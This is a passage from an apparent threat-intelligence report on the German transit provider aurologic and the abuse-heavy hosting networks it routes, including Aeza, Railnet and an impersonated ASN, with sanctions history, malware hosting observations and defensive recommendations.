ransomware, Lumma and Meduza infostealers, and RedLine Stealer.The list of designated companies includes:Aeza International Ltd (UK branch)Aeza Logistic LLC (Russia-based subsidiary)Cloud Solutions LLC (Russia-based subsidiary)On September 19, 2025, the UK government followed the OFAC action by sanctioning the UK-registered Aeza International Ltd, citing its involvement in “destabilizing Ukraine by providing internet services to Russian disinformation campaigns.” However, at the time of writing, Aeza International remains a legally registered company in the United Kingdom and has yet to be struck off the company register.Despite the arrests of its co-founders and the imposition of sanctions, Aeza has demonstrated a sustained ability to reallocate its infrastructure. Rather than signaling operational decline, these actions appear to have prompted a rapid reorganization of assets aimed at preserving control over key network resources and maintaining service continuity.Within 24 hours of OFAC’s July 2025 sanctions, Insikt Group observed Aeza begin to reallocate its US IP resources to a Serbian organization under the name Smart Digital Ideas DOO, an entity registered mere hours after OFAC announced the sanctions (see ). Insikt Group assessed with high confidence that this was intended to retain control of any assets affected by the OFAC sanctions.RIPE organization record for Smart Digital Ideas (Source:On July 3, 2025, Insikt Group identified the emergence of Hypercore Ltd, a UK-registered company with infrastructure directly linked to Aeza. On July 4, 2025, Hypercore Ltd was re-assigned IP prefix  from Smart Digital Ideas DOO, an allocation which was created only one day prior (see ). 45[.]142[.]122[.]0/24 reallocation to Hypercore Ltd (Source: RIPEstat)On July 7, 2025, Smart Digital Ideas DOO was assigned ASN AS215829 in the RIPE database (see ). Notably, the sponsoring org ORG-AIL64-RIPE was Aeza International Ltd, and the AS object also contains references tracing back to Cloud Solutions LLC.RIPE objects associated with Smart Digital Ideas AS215829 (Source: RIPE)Aeza has remained a prominent source of malicious activity throughout 2025. Based on Recorded Future® Malware Intelligence, Insikt Group identified multiple malware samples exhibiting network connections to AS210644. These samples predominantly included infostealers and remote access trojans (RATs) such as AsyncRAT, Destiny Stealer, Meduza Stealer, REMCOS RAT, Rhadamanthys Stealer, RisePro Stealer, and QuasarRAT.Insikt Group’s recent analysis of the pro-Russian group DDoSia further highlighted Aeza’s continued role in the cybercrime landscape, with Aeza International Ltd (AS210644) accounting for 7.5% of all identified Tier 1 command-and-control (C2) servers between July 2024 and July 2025 (see ). Also of note, other ASs using aurologic’s services collectively accounted for a further 6% of observed C2 infrastructure, while approximately 13.5% of DDoSia Tier 1 C2 IP addresses were announced either directly by aurologic or by ASNs receiving upstream transit from it.Femo IT Solutions LimitedFemo IT Solutions Limited (AS214351) is a UK-incorporated organization that, despite announcing only two  prefixes, has consistently displayed one of the highest concentrations of validated malicious infrastructure relative to its size, according to Recorded Future Network Intelligence. IP addresses announced by Femo IT Solutions hosted C2 infrastructure for Cobalt Strike, DcRat, Rhadamanthys Stealer, TinyLoader, and THC Hydra. Furthermore, Recorded Futures Malware Intelligence highlighted a number of malware samples exhibiting network connections to Femo IT Solutions infrastructure, such as Amadey, Aurotun, QuasarRAT, RedLine Stealer, REMCOS RAT, Stealc, SystemBC, and SvcStealer.Femo IT Solutions' IP prefixes  and  are both routed exclusively via aurologic (see ).Femo IT Solutions routing (Source:IP prefix  is directly controlled by Femo IT Solutions. The prefix was assigned from a larger  block belonging to the Iranian Research Organization for Science and Technology (IROST), a government-controlled body under Iran’s Ministry of Science, Research and Technology. Sub-allocations from this space have also been leveraged by other suspected TAEs tracked by Insikt Group, including Aeza entities Aeza International (AS210644), Hypercore Ltd, and Smart Digital Ideas DOO, as well as Global Connectivity Solutions and Global Internet Solutions (see ).The second announced prefix, , is attributed to New Way LLC, a company registered in Oman. This allocation derives from a  netblock controlled by Iranian internet service provider (ISP) Farahoosh Dena PLC, which offers data center and hosting services. The RIPE object for this range lists contradictory details, including a Philadelphia residential address and an Omani registration ().The network relies exclusively on Aurologic for upstream connectivity and shows clear operational ties to the bulletproof hosting provider Defhost (see ).Defhost emphasizes “fast abusive VPD/VDS” with resilience against takedown efforts by any government, specifically Western law enforcement, and anti-abuse organizations such as “The Spamhaus Project,” while simultaneously assuring customers that its operations will remain uninterrupted. Insikt Group assesses with high confidence that Femo IT Solutions is under the control of Defhost.Global-Data System IT CorporationGlobal-Data System IT Corporation (AS42624), also recognized under the name SWISSNETWORK02, emerged in July 2024 following the transfer of ASN resources from Simple Carrier LLC (). Within just over a year of operation, the network accumulated one of the highest concentrations of malicious activity observed in Recorded Future’s Network Intelligence, ranking within the top ten for malicious activity density as of September 2025. Its infrastructure has hosted a wide range of malware families, including Cobalt Strike, Sliver, QuasarRAT, Remcos Rat, Dark Crystal RAT, Latrodectus, Amadey, and multiple stealer families such as Rhadamanthys, RedLine Stealer, and Meduza.Simple Carrier LLC transferring AS34888 and AS42624 to Global-Data System IT Corporation (Source: RIPE DB)Insikt Group has assessed with medium confidence that Global-Data System IT Corporation is closely tied to PrivateAlps, an offshore privacy-centric hosting provider registered in Switzerland that openly advertises no Know-Your-Customer (KYC) policies, Digital Millennium Copyright Act (DMCA)-ignored hosting, and Tor-friendly infrastructure.Beyond malware hosting, the infrastructure has supported DDoSIA, Socks5Systemz, and other commodity malware ecosystems. It has also been leveraged in targeted campaigns, such as TAG-144’s operations against Latin American governments.All of Global-Data System IT Corporation’s active prefixes are routed solely through aurologic. Routing graphs from September 2025 confirm that all eleven IPv4 prefixes are routed through aurologic, with no diversification, making aurologic the critical enabler of Global-Data System IT Corporation’s reach and resilience.By anchoring its connectivity to a German upstream like aurologic, Global-Data Systems IT Corporation maintains global availability despite repeated associations with malicious infrastructure. Global-Data System IT Corporation’s reliance on a single upstream provider creates a natural single point of failure that could, if interrupted, materially disrupt its operations. The persistence of this arrangement, however, highlights how aurologic’s connectivity enables the network’s reach and suggests permissive or insufficient vetting practices, consistent with patterns observed in other aurologic-linked suspected TAEs such as metaspinner net GmbH and Railnet LLC.Metaspinner net GmbH (AS209800) was a recently registered autonomous system created on April 25, 2025, and was announced exclusively through aurologic (). The name “metaspinner net GmbH” had long since been associated with a legitimate Hamburg-based software company. However, multiple factors indicate that the autonomous system “metaspinner” was not controlled by the same entity, but rather by threat actors likely affiliated with Virtualine Technologies.[UPDATE] As of November 10, 2025, metaspinner net GmbH has provided substantial evidence confirming Insikt Group’s original assessment that their identity was unlawfully and fraudulently used in the registration of AS209800. A falsified RIPE end-user agreement provided to Insikt Group highlights how a basic verification check against publicly accessible company registration documents could have prevented the fraudulent registration. metaspinner net GmbH (Hamburg, Germany) has no affiliation with AS209800, Virtualine Technologies, or any related malicious activity associated with that network.Since its inception, AS209800 has accumulated a substantial malicious footprint. Recorded Future has observed infrastructure within the ASN hosting a wide array of malware families and related tooling, including loaders like TinyLoader and SmokeLoader, information stealers such as Stealc, Amadey, and Phorpiex, and multiple remote access trojans, including AsyncRAT, njRAT, QuasarRAT, Dark Crystal RAT, and REMCOS RAT. Botnets such as Moobot, as well as post-exploitation frameworks like Cobalt Strike, have also been detected. These observations align with Spamhaus, which has recently taken notice of the high volume of suspicious activities appearing from the network within a short timeframe.*: AS209800 appearing downstream from AS30823, aurologic GmbH, on October 3, 2025 (Source: bgp[.]tools)*As of October 3, 2025, AS209800 originated twelve IPv4 prefixes within the ranges , , and . According to RIPE, none of these IPv4 blocks are owned by metaspinner. Instead, they are sub-allocated from a Turkish local internet registry (LIR) MGN Teknoloji Anonim Sirketi, headquartered in Istanbul (). This LIR also sponsors several other suspicious ASNs, all of which were created in 2025 ().*: Visualization of IPv4 prefixes being assigned to metaspinner. (Source: Recorded Future)*
        AS209800’s historical footprint further suggests possible repurposing. AS209800 briefly advertised an IPv6  in December 2020 before going dormant, only to reemerge in 2025 with entirely new IPv4 address spaces and links to MGN Teknoloji. While no official transfer was logged in RIPE, the shift in behavior suggests the ASN was taken over or reallocated, a tactic consistent with other impersonation incidents observed in the same timeframe, such as VSVK Onderhoud B.V. (AS213511).Irregularities are evident in domain registrations. The legitimate software company by the same name, metaspinner, used to operate the domain  and , which over time redirected to its current domain,  (see ). The domain , originally lapsed in the mid-2000s, was re-registered on April 18, 2025, initially through URL Solutions, Inc., and later its record was updated to reflect its registrar as NiceNIC, a registrar known for abuse-tolerant practices.*: The legitimate software company metaspinner net GmbH listed on the US version of* preispiraten[.]de pricepirates[.]com  pricepirates[.]com*: Preispiraten (aka Pricepirates) listed as a service of metaspinner net GmbH on the “Imprint” page (Source:* preispiraten[.]deAt the time of analysis,  was hosted at IP address  which Insikt Group assesses with high confidence to be associated with Virtualine Technologies. Both RIPE and WHOIS data for the domain list a virtual office address in London’s 71-75 Covent Garden, an address previously used by organizations tied to Virtualine Technologies. Historical IP hosting records for  show that  operated on shared infrastructure with domains linked to Virtualine Technologies, such as  and . Historical IP hosting records also show that it shared infrastructure with , a domain once associated with VSVK Onderhoud B.V. (AS213511). Furthermore,  is also hosting four additional suspicious hosting-related domains: , , a, and . More details on the significance of these domains and their connection to Virtualine Technologies are outlined in the next subsections.The name of a legitimate Dutch construction firm, VSVK Onderhoud B.V., was used to register AS213511 on January 27, 2025. The legitimate VSVK Onderhoud operates exclusively in the Netherlands and has no IT or telecommunications business. According to historical WHOIS data, AS213511 was observed having Railnet LLC (AS214943) as its upstream provider. Railnet LLC notably has strong ties to Virtualine Technologies. This observed incident underscores an emerging pattern in AS-level impersonation campaigns, where threat actors may fabricate corporate identities and leverage legitimate-seeming infrastructure to enable phishing and IP hijacking schemes. As of writing, AS213511 is no longer observed on the global routing table.Proxio ( appears to be a newly established proxy service with notable connections to Virtualine Technologies. Proxio has been recently advertised across dark web and underground forums, positioning itself as a high-speed residential or mixed proxy provider. Notably, a forum user operating under the alias “Secury” on BlackHatWorld Forum, with a Virtualine Technologies logo as the profile picture, was observed promoting the Proxio service (see ). This overlap in branding and infrastructure strongly reinforces the likelihood that Proxio and Virtualine Technologies are linked.*: BlackHatWorld user “Secury” advertising Proxio (Source: BlackHatWorld)*Anti-Red Hosting (claims to be providing “Anonymous Anti-Red Bulletproof Hosting,” with its domain registration also listing a virtual office address in London’s Covent Garden.

This shift occurred at the peak of malicious activity on the network, with Recorded Future’s Network Intelligence identifying over 76 validated C2 servers.*: Prefixes once observed under “METASPINNER” (AS209800) are now showing a description of “LANEDONET” as of October 22, 2025 (Source:* *: An example of one of metaspinner’s IPv4 prefixes being reassigned to lanedonet (Source:* Lanedonet Datacenter was registered with RIPE on the same day of the IP prefix transfers from metaspinner, with a listed address of Strawinskylaan 3051 1077 ZX, Amsterdam.

There is currently only one RIPE resource assigned to Lanedo GmbH at the time of writing, IPv6 prefix .Insikt Group assesses with high confidence that the threat actor(s) behind metaspinner have mirrored their technique of impersonating a legitimate company when setting up , pivoting from metaspinner, as the network had come under increased scrutiny due to its high volume of malicious traffic.Railnet LLC (AS214943) was incorporated in April 2024 and, within its first year of operation, quickly emerged as one of the most abuse-heavy networks tracked by Recorded Future. Infrastructure hosted in Railnet’s space has supported over 30 malware families, including DarkComet, Amadey, Remcos RAT, Latrodectus, Dark Crystal RAT, and commodity stealers such as Rhadamanthys, StealC, Vidar, and Lumma.Railnet is formally registered in Kentucky under an address linked to an organization named Whitelabel Networks LLC, and an incorporation agent tied to several other questionable hosting entities. While Kentucky is not a traditional secrecy jurisdiction, the choice of state and use of mail-drop offices suggest an effort to reduce visibility by avoiding more obvious havens, such as Delaware or offshore jurisdictions.According to routing data observed on August 28, 2025, Railnet originated nineteen IPv4 prefixes, of which approximately 95% are routed via aurologic (), with only a single  range being routed through another German provider, Pfcloud UG.Railnet LLC’s routing through aurologic GmbH as of August 28, 2025 (Source:bgp[.]tools)Railnet’s operational significance lies not just in the malware hosted directly, but in its role enabling multiple bulletproof hosting entities like Virtualine Technologies, DripHosting (DiorHost), and RetryHost.Virtualine Technologies, a Russia-linked bulletproof hoster that openly advertises on Russian-language forums, leases at least fourteen prefixes originated by Railnet (). These prefixes are often registered to various LIRs, which are then announced via Railnet, allowing Virtualine to mask ownership while maintaining operational control. Virtualine’s registration address in London’s 71-75 Covent Garden, a hub for shell entities, has also been associated with other suspected TAEs, including Stark Industries Solutions, Aeza International Ltd, and Global Connectivity Solutions LLC.*: IP sub-allocation from Rapidnet to Virtualine Technologies, routed through Railnet LLC (Source:* Railnet originates multiple prefixes used by DripHosting, a provider that brands itself interchangeably as DiorHost ().

RetryHost explicitly markets itself as “bulletproof,” and overlapping infrastructure suggests close coordination or common backend management between Railnet and RetryHost.*: IP sub-allocation from Telco Power Ltd to RetryHost, routed through Railnet LLC (Source:* These providers collectively demonstrate how Railnet acts as a common backbone for “bulletproof” hosting operations, offering anonymity, routing resilience, and the ability to cycle short-lived leased prefixes to evade detection and blacklisting ().Railnet LLC’s observed prefixes from September 2024 to August 2025 (Source:By carrying the vast majority of Railnet’s traffic, aurologic effectively extends global reach to three separate bulletproof hosting brands that have been consistently tied to malware distribution, botnet infrastructure, and illicit VPS or RDP services. While Railnet’s operators leverage offshore formations, obscure company formations, and prefix cycling to obscure their footprint, the persistence of their upstream relationship with aurologic highlights a broader concern: the enabling role of established European networks in sustaining high-risk or high-abuse infrastructure.As of October 27, 2025, Recorded Futures Network Intelligence observed over 80 validated C2 servers on Railnets AS. This is likely a direct result of originating the twelve IPv4 prefixes transferred from metaspinner to Lanedo Datacenter ().The case with Railnet underscores a recurring theme: aurologic’s upstream connectivity does not appear incidental, but repeatedly visible in the routing paths of various TAEs. Railnet and other TAEs appear highly dependent on aurologic’s permissive transit to maintain continuity despite widespread abuse reporting.The Fine Line Between Neutrality and NegligenceThe persistence of aurologic’s upstream connectivity to multiple suspected TAEs raises a broader question that extends beyond any single provider: To what extent are such relationships the result of negligence, a failure to apply due diligence, as opposed to complicity, where providers knowingly accept or tolerate high-risk customers as a part of their business model? In the context of internet infrastructure, this distinction is critical but often difficult to prove. Transit providers occupy a unique position as gatekeepers of global connectivity. Their willingness or unwillingness to sever ties with abuse-heavy networks directly determines whether malicious infrastructure remains reachable.Negligence in this context often manifests as weak Know-Your-Customer (KYC) procedures, insufficient abuse handling, or a lack of proactive monitoring of downstream announcements. Many upstream networks argue they cannot fully control their downstream customers’ actions and rely on complaints to trigger action or simply redirect any abuse reporting to the customer in question, taking no further action. While aurologic has echoed a similar line of defense, typically directing abuse complaints to its abuse email address, hosting community members have offered anecdotal evidence stating otherwise ().*: LowEndSpirit Forum user “Encoders” describing no responses to abuse complaints (Source:* *: LowEndSpirit user “Treesmokah” pointing out that Hofmann’s Tornado Datacenter had been allegedly raided due to its relationship with Pfcloud UG. (Source:* In June 2024, CORRECTIV, a German non-profit investigative journalism organization, met with aurologic CEO, Joseph Hofmann at his office in Langen to discuss Qurium’s findings that data traffic from Tnsecurity Ltd and other companies in Aeza’s sphere of influence ran through aurologic’s infrastructure, leveraging its connectivity to global internet providers and supporting the Doppelgänger disinformation campaign. Hofmann maintained that he was unaware of any of his customers supporting the campaign, but appeared surprised when shown a link to a fake news article that led to his organization. He argued that this did not constitute definitive proof and insisted that only formal contact from authorities would prompt action. Hofmann describes his situation as a business dilemma, stating, “I can kick everyone out, but then at some point I won’t make any sales,” and that is why he waits for law enforcement correspondence.aurologic’s sustained relationships with multiple TAEs strain the boundaries of plausible negligence. Its continued role in providing upstream transit for Aeza International Ltd, despite US and UK sanctions, suggests a reactive posture focused on legal compliance rather than risk avoidance. Since aurologic operates under German jurisdiction, it may not be violating domestic law. On July 1, 2025, Joseph Hofmann, under the username “jh_aurologic”, publicly defended the company’s position on the LowEndTalk forum (), claiming the customer under review was  Aeza Group LLC. As of this writing, aurologic is not an upstream provider for Aeza Group LLC (AS216246), but remains a major upstream provider for Aeza International Ltd (AS210644).*: aurologic CEO Joseph Hofmann commenting on the situation surrounding Aeza Group LLC (Source:* The distinction between oversight and permissive policy is further blurred by the ease and pace at which fraudulent downstream providers rebrand by leveraging obscure or offshore entities, cycling through prefixes, and establishing new LIRs. This pattern was exemplified in a case documented by Spamhaus, which detailed a now-defunct network of TAEs all operating behind layers of decoy ISPs and ultimately routed through aurologic (see ).*: The Spamhaus Project points out aurologic’s proximity to malicious networks (Source:* X, formerly knows as Twitter)On April 7, 2025, Spamhaus again cited aurologic, describing it as an ISP with a “considerable history of bulletproof hosting proliferation” in relation to its provision of connectivity 49.3 Networking LLC (AS399979). Hofmann publicly disputed the characterization, asserting that the company “has no considerable history of bulletproof hosting” and that employees “react according to applicable law” when receiving abuse reports (see ). In the same thread, Hofmann engaged in a broader discussion with security researcher “Gi7w0rm” regarding aurologic’s continued service to Aeza despite its founders’ arrests and sustained malicious activity. Hoffman outlined his broader stance on maintaining neutrality toward the activity occurring across aurologic’s network, describing neutrality as “the art of being impartial.” This position suggests a broader posture of deliberate non-interference in the name of neutrality, which in practice could explain the persistence of high-risk and abusive networks under aurologic’s infrastructure.*: Joseph Hofmann’s public responses to Spamhaus’ post regarding 49.3 Networking LLC (Source:* X, formerly known as Twitter)From the perspective of impacted victims or network defenders, the difference between negligence and complicity is often meaningless if threat actors are enabled to operate freely. When transit providers like aurologic fail to regularly investigate recurring abuse, whether out of resource constraints, business tolerance, or the legal limitations placed on them, the effect is the same: malicious infrastructure remains globally accessible. Under current EU and German law, transit providers are not generally required to proactively monitor or police customer activity unless they possess actual knowledge of illegal use.aurologic has alluded to strict German data-protection obligations as one of many reasons for avoiding actions such as direct traffic inspection. While that is a legitimate concern, overreliance on that stance can mask operational complacency. The posture is also reflected in the company’s own Terms of Service, which explicitly invoke the EU’s Digital Services Act (DSA) to disclaim liability for content “stored, processed, or transmitted on customer-leased infrastructure,” provided the company is unaware of its existence or does not “actively support illicit use.” Abuse reports are to be verified, forwarded to the customer, and, if unresolved within 24 hours, may result in null-routing of the affected IP address. Only in “rare cases posing higher risks” does aurologic reserve the right to take proactive measures.The company’s public abuse-handling and authority-request policies follow a similar reactive model. All complaints must be submitted via a designated email channel () and include a full evidentiary record. Invalid or incomplete submissions are dismissed automatically. These procedures illustrate how aurologic's operational structure aligns with the reactive, notice-based compliance regime established by the Digitale-Dienste-Gesetz (DDG) and DSA. The company’s obligations begin only once it receives valid notice of abuse, and its enforcement options are further bound by procedural and jurisdictional limits. This framework not only defines but effectively constrains how far a provider can intervene, creating an environment where inaction remains legally defensible even amid persistent abuse. In this sense, aurologic’s abuse handling can be seen as a product of the broader European intermediary-liability model, which tends to prioritize legal defensibility over proactive security stewardship.In practice, this means a provider like aurologic remains compliant with national law even when its network is repeatedly leveraged by threat actors, so long as it can claim lack of awareness of intent. The legal framework effectively absolves transit and hosting providers from responsibility for downstream misuse of their services, allowing malicious infrastructure to persist as long as it operates within the boundaries of plausible deniability.The uncertainty over whether upstream providers are merely negligent or knowingly complicit underscores a central challenge in combating infrastructure abuse. Larger transit providers often defend their practices by citing contractual compliance and legal obligations, yet this narrow framing leaves ample room for high-risk networks to operate undeterred. For the cybersecurity community, regulators, and policymakers, the question is not only whether negligence or permissiveness is at play, but also how to impose accountability when routing decisions repeatedly sustain threat actors engaged in disinformation, cybercrime, and malware distribution.Use Recorded Future Threat Intelligence: Recorded Future customers can proactively mitigate threats originating from malicious networks, such as those discussed in this report, by operationalizing Recorded Future Intelligence Cloud data. This can be achieved by leveraging continuously updated Risk Lists and by blocklisting validated malicious IP addresses to prevent internal communication with malicious infrastructure.Implement Robust Network Security Controls: Configure perimeter security appliances and internal network defenses to block traffic originating from the ASNs identified in this report, unless there is a clearly defined business justification for permitting such traffic.Insikt Group assesses with high confidence that aurologic is likely to remain a central hub for TAE networks. Despite growing public pressure and international sanctions against its downstream customers, aurologic continues to operate within the bounds of its legal obligations, providing upstream connectivity that is ultimately enabling the highest concentrations of malicious activity observed within Recorded Future Network Intelligence. This, combined with the absence of coordinated regulatory enforcement, suggests that the conditions enabling high-risk networks to persist under its infrastructure are unlikely to change.While the exact reason for aurologic’s continued prominence among these networks cannot be confirmed, the company’s public defense of, and ongoing provision of services to, Aeza despite multiple international sanctions, coupled with its publicly stated position of neutrality toward activity on its network, has likely reinforced its reputation among TAEs as a dependable upstream provider.This case also reflects the greater question at hand within the hosting ecosystem: At what point does neutrality or persistent inaction in the face of systemic abuse become indistinguishable from complicity? As long as transit providers are able to maintain legal compliance while continuing to service networks repeatedly associated with malicious activity, the responsibility for intervention remains displaced onto their customers, even when those customers are the source of the abuse. Until these gaps in compliance, accountability, and proactive oversight are addressed, TAEs will continue to thrive.Appendix A: Active Networks Linked to aurologicGlobal-Data System IT Corporation (SWISSNET 02)Femo IT Solutions LimitedVladylsav Naumets (PrivateNetwork.ltd)MXCLOUD Ltd (downstream of WAIcore)IP-Projects GmbH & Co.
